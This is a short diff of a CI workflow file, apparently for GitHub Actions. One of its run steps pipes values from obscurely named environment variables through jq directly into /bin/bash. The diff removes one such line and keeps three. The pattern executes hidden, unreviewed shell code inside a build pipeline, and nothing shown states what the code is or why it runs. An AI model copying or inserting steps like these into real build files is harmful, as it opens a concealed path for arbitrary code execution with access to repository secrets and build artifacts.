@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$m43" | jq -r .hnxme48375 | /bin/bash
           echo $x85664 | jq -r .sm548 | /bin/bash
-          echo $zdmps7552 | jq -r .w6 | /bin/bash
           printf '%s' "$oh52810" | jq -r .jyoqw348 | /bin/bash
 
       - name: Upload artifact
